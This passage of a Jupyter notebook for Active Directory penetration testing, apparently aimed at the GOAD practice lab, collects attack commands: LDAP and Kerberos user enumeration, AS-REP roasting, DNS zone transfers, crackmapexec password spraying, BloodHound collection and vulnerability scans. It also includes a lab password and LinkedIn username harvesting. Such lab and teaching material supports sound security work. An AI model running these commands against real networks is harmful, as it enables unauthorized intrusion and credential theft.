   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Recon"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#enum4linux -U <dc-ip> | grep 'user:'\n",
    "!enum4linux -U 10.2.10.11 | grep 'user:'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "---------\n",
    "nmcli dev show eth0  # show domain name & dns\n",
    "nslookup -type=SRV _ldap._tcp.dc._msdcs.//DOMAIN/\n",
    "nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10\n",
    "---------\n",
    "setup /etc/hosts and kerberos\n",
    "\n",
    "# /etc/hosts\n",
    "# GOAD\n",
    "192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding\n",
    "192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell\n",
    "192.168.56.12   essos.local meereen.essos.local meereen\n",
    "192.168.56.22   castelblack.north.sevenkingdoms.local castelblack\n",
    "192.168.56.23   braavos.essos.local braavos\n",
    "\n",
    "sudo apt install krb5-user\n",
    "\n",
    "---\n",
    "/etc/krb5.conf \n",
    "\n",
    "[libdefaults]\n",
    "  default_realm = essos.local\n",
    "  kdc_timesync = 1\n",
    "  ccache_type = 4\n",
    "  forwardable = true\n",
    "  proxiable = true\n",
    "  fcc-mit-ticketflags = true\n",
    "[realms]\n",
    "  north.sevenkingdoms.local = {\n",
    "      kdc = winterfell.north.sevenkingdoms.local\n",
    "      admin_server = winterfell.north.sevenkingdoms.local\n",
    "  }\n",
    "  sevenkingdoms.local = {\n",
    "      kdc = kingslanding.sevenkingdoms.local\n",
    "      admin_server = kingslanding.sevenkingdoms.local\n",
    "  }\n",
    "  essos.local = {\n",
    "      kdc = meereen.essos.local\n",
    "      admin_server = meereen.essos.local\n",
    "  }\n",
    "...\n",
    "---\n",
    "\n",
    "dpkg-reconfigure krb5-config\n",
    "getTGT.py essos.local/khal.drogo:horse\n",
    "\n",
    "export KRB5CCNAME=/workspace/khal.drogo.ccache \n",
    "smbclient.py -k @braavos.essos.local"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## AD Username and password list from Website"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Create Username list from LinkedIn\n",
    "\n",
    "\n",
    "https://github.com/initstring/linkedin2username\n",
    "\n",
    "linkedin2username.py -c targetco -d 5 -n 'targetco.com'\n",
    "\n",
    "\n",
    "usage: linkedin2username.py [-h] -c COMPANY [-n DOMAIN] [-d DEPTH]\n",
    "  [-s SLEEP] [-x PROXY] [-k KEYWORDS] [-g] [-o OUTPUT]\n",
    "\n",
    "OSINT tool to generate lists of probable usernames from a given company's LinkedIn page.\n",
    "This tool may break when LinkedIn changes their site.\n",
    "Please open issues on GitHub to report any inconsistencies.\n",
    "\n",
    "optional arguments:\n",
    "  -h, --help            show this help message and exit\n",
    "  -c COMPANY, --company COMPANY\n",
    "                        Company name exactly as typed in the company linkedin profile page URL.\n",
    "  -n DOMAIN, --domain DOMAIN\n",
    "                        Append a domain name to username output.\n",
    "                        [example: \"-n targetco.com\" would output jschmoe@targetco.com]\n",
    "  -d DEPTH, --depth DEPTH\n",
    "                        Search depth (how many loops of 25). If unset, will try to grab them\n",
    "                        all.\n",
    "  -s SLEEP, --sleep SLEEP\n",
    "                        Seconds to sleep between search loops. Defaults to 0.\n",
    "  -x PROXY, --proxy PROXY\n",
    "                        Proxy server to use. WARNING: WILL DISABLE SSL VERIFICATION.\n",
    "                        [example: \"-p https://localhost:8080\"]\n",
    "  -k KEYWORDS, --keywords KEYWORDS\n",
    "                        Filter results by a a list of command separated keywords.\n",
    "                        Will do a separate loop for each keyword,\n",
    "                        potentially bypassing the 1,000 record limit.\n",
    "                        [example: \"-k 'sales,human resources,information technology']\n",
    "  -g, --geoblast        Attempts to bypass the 1,000 record search limit by running\n",
    "                        multiple searches split across geographic regions.\n",
    "  -o OUTPUT, --output OUTPUT\n",
    "                        Output Directory, defaults to li2u-output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## LDAP Enumeration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ldapsearch -x -h 10.2.10.11 -b \"DC=domain,DC=com\" -s sub \"(objectClass=*)\" "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Extract Users from LDAP:\n",
    "\n",
    "ldapsearch -x -h 192.168.1.1 -b \"DC=domain,DC=com\" \"(objectClass=user)\" sAMAccountName #> users.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Extract Computers from LDAP:\n",
    "\n",
    "ldapsearch -x -h 192.168.1.1 -b \"DC=domain,DC=com\" \"(objectClass=computer)\" name #> computers.txt\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Kerberos Enumeration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Enumerate Kerberos Users (using kerbrute):\n",
    "\n",
    "kerbrute userenum --dc 192.168.1.1 -d domain.com users.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Request a Kerberos Ticket (using impacket):\n",
    "\n",
    "python3 GetNPUsers.py domain.com/ -usersfile users.txt -no-pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "## DNS Enumeration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Query DNS for Domain Records (using dig):\n",
    "\n",
    "dig @192.168.1.1 domain.com ANY"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Perform a Zone Transfer (if allowed):\n",
    "\n",
    "dig axfr @192.168.1.1 domain.com"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Enumerate DNS Records (using dnsenum):\n",
    "\n",
    "dnsenum domain.com"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Password Spraying"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Perform a Password Spray Attack (using crackmapexec):\n",
    "\n",
    "crackmapexec smb 192.168.1.1 -u users.txt -p passwords.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# BloodHound Data Collection (Linux) Use SharpHound (via impacket or bloodhound-python):\n",
    "\n",
    "bloodhound-python -d domain.com -u username -p password -ns 192.168.1.1 -c All\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# NTLM Authentication Testing: Check for NTLM Authentication (using ntlm-info):\n",
    "\n",
    "ntlm-info -t 192.168.1.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# SNMP Enumeration: Enumerate SNMP Information (using snmpwalk):\n",
    "\n",
    "snmpwalk -c public -v1 192.168.1.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Vulnerability Scanning: Scan for Vulnerabilities (using nikto or nmap):\n",
    "\n",
    "nikto -h 192.168.1.1\n",
    "nmap --script vuln 192.168.1.1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# END TIME"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "now = datetime.now()\n",
    "\n",
    "end_time = now.strftime(\"%H:%M:%S\")\n",
    "print(\"End Time =\", end_time)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "a32f0eda-e181-439b-a5e6-18375a13db58"
    }
   },
   "source": [
    "# Parsing Script & Excel Deliverable Serialization"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "nbpresent": {
     "id": "11e92f0d-28b2-4265-bd96-9b4e705e6948"
    }
   },
   "outputs": [],
   "source": [
    "#REQ: import requirements: pandas, openpyxl\n",
    "import pandas as pd\n",
    "import os\n",
    "import csv\n",
    "import glob\n",
    "import xlsxwriter\n",
    "import openpyxl\n",
    "\n",
    "\n",
    "#path to parse to and read files from\n",
    "path = \"/root/.jupyter/{}/\".format(FOLDER_NAME)\n",
    "\n",
    "#all files ending in .csv\n",
    "all_files = glob.glob(os.path.join(path, \"*.csv\"))\n",
    "\n",
    "#initialize writer\n",
    "writer = pd.ExcelWriter('/root/.jupyter/' + FOLDER_NAME + '/' + FOLDER_NAME + '_OSINT.xlsx', engine='openpyxl')\n",
    "\n",
    "#write all files into excel from dataframes and name worksheet by filename \n",
    "print(\"The following files are being parsed to \" + path + \":\") \n",
    "print(\"\")\n",
    "for f in all_files:\n",
    "    df = pd.read_csv(f)\n",
    "    print(f)\n",
    "    df.to_excel(writer, sheet_name=os.path.basename(f))\n",
    "\n",
    "writer.save()  \n",
    "\n",
    "print(\"\")\n",
    "print(\"Parsing of \" + FOLDER_NAME + \"_OSINT.xlsx Complete\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Use Deepseek to review results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "# Define the API endpoint (replace with DeepSeek's actual API endpoint)\n",
    "api_url = \"https://api.deepseek.com/review\"\n",
    "\n",
    "# Prepare the payload (send the nmap output)\n",
    "payload = {\n",
    "    \"output\": nmap_output\n",
    "}\n",
    "\n",
    "# Send the request to the API\n",
    "response = requests.post(api_url, json=payload)\n",
    "\n",
    "# Check if the request was successful\n",
    "if response.status_code == 200:\n",
    "    review_results = response.json()\n",
    "    print(\"DeepSeek Review Results:\")\n",
    "    print(review_results)\n",
    "else:\n",
    "    print(\"Error sending request to DeepSeek API:\", response.status_code)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Reference\n",
    "\n",
    "- Recon: https://chat.deepseek.com/a/chat/s/5d783f90-4e9a-4af1-9ac9-538eeec422d0\n",
    "- GOAD Walk thru: https://mayfly277.github.io/posts/GOADv2-pwning-part2/\n",
    "- The Bear Necessities: https://spellzed.github.io/spellzedblog/2025/03/03/the-bear-necessities.html#lab-environment\n",
    "- Game Of Active Directory, Learn how to attack and detect AD attacks: https://www.youtube.com/watch?v=XjgxQ6gHfyU\n",
    "- DEF CON 32 - Winning the Game of Active Directory - Brandon Colley: https://www.youtube.com/watch?v=M-2d3sM3I2o&t=79s\n",
    "- A Drop of Jupyter: A Modular Approach to Penetration Testing: https://www.youtube.com/watch?v=LTNKMA65BtI\n",
    "- https://github.com/obheda12/JupyterPen\n",
    "- https://github.com/obheda12/OSINT-Threat-Intel-Scripts\n",
    "- Deepseek hacking AD - nmap -p- -sC -sV 10.2.10.0/24 -Pn -oA allports.nmap"
   ]
  }
 ],
 "metadata": {
  "anaconda-cloud": {},
  "celltoolbar": "Raw Cell Format",
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.2"
  },
  "nbpresent": {
   "slides": {},
   "themes": {}
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
